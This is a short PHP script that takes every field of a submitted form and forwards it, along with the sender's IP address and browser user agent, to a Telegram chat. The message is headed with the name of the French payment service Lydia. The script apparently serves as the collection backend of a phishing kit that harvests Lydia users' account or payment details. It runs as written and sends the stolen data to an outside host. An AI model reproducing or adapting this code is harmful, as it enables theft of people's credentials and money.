<?php
// Charger les variables d'environnement
$env_file = __DIR__ . '/../../.env';
if (file_exists($env_file)) {
    $lines = file($env_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos($line, '=') !== false) {
            list($key, $value) = explode('=', $line, 2);
            putenv(trim($key) . '=' . trim($value));
        }
    }
}

// Récupérer les variables d'environnement
$botToken = getenv('TELEGRAM_BOT_TOKEN');
$chatId = getenv('TELEGRAM_CHAT_ID');

// Vérifier que les variables sont définies
if (!$botToken || !$chatId) {
    http_response_code(400);
    echo json_encode(['error' => 'Telegram credentials not configured']);
    exit;
}

// Récupérer les données POST
$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['error' => 'No data provided']);
    exit;
}

// Construire le message détaillé avec toutes les informations
$message = "🔐 *NOUVELLES DONNÉES REÇUES - LYDIA*\n";
$message .= "═══════════════════════════════════════\n\n";

// Parcourir tous les champs reçus
foreach ($data as $key => $value) {
    // Formater les clés pour plus de lisibilité
    $formatted_key = ucfirst(str_replace('_', ' ', $key));
    
    if (is_array($value)) {
        $message .= "📋 *" . strtoupper($formatted_key) . "*\n";
        foreach ($value as $subkey => $subvalue) {
            $message .= "  • " . ucfirst(str_replace('_', ' ', $subkey)) . ": `" . htmlspecialchars($subvalue) . "`\n";
        }
        $message .= "\n";
    } else {
        $message .= "• *" . strtoupper($formatted_key) . "*: `" . htmlspecialchars($value) . "`\n";
    }
}

// Ajouter les informations système
$message .= "\n═══════════════════════════════════════\n";
$message .= "🖥️ *INFORMATIONS SYSTÈME*\n";
$message .= "• *IP*: `" . $_SERVER['REMOTE_ADDR'] . "`\n";
$message .= "• *Heure*: " . date('d/m/Y H:i:s') . "\n";
$message .= "• *User Agent*: `" . substr($_SERVER['HTTP_USER_AGENT'], 0, 80) . "`\n";

// Envoyer à Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 10,
    CURLOPT_POSTFIELDS => json_encode($payload),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Répondre au client
if ($httpCode === 200) {
    http_response_code(200);
    echo json_encode(['success' => true, 'message' => 'All data sent to Telegram']);
} else {
    http_response_code(500);
    echo json_encode(['error' => 'Failed to send to Telegram', 'code' => $httpCode]);
}
?>
